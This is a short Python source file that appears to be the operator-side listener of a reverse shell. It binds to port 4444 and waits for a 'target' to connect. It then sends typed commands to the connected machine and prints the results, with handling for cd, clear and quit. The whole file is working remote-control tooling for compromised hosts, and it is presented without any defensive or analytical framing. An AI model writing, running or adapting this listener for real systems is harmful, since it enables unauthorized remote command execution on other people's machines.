import os
import socket
import json
from colorama import init, Fore

init(autoreset=True)

SERVER_IP = "0.0.0.0"
SERVER_PORT = 4444


def send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


def recv():
    data = ""
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def server():
    while True:
        command = input(f"[{Fore.CYAN}{target_ip[0]}{Fore.RESET}]: ")
        send(command)
        if command.lower().strip() == "quit" or command.lower().strip() == "exit":
            break
        elif command.lower().strip()[:3] == "cd ":
            pass
        elif command.lower().strip() == "cls" or command.lower().strip() == "clear":
            os.system("cls" if os.name == "nt" else "clear")
        else:
            result = recv()
            print(result)


server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))

print(f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Listening For Incoming Connections")
server_sock.listen(5)
target_sock, target_ip = server_sock.accept()
print(
    f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Target Connected From: {Fore.CYAN}{target_ip[0]}{Fore.RESET}"
)

try:
    server()
except KeyboardInterrupt:
    print(f"\n[{Fore.LIGHTRED_EX}-{Fore.RESET}] Server Stopped")
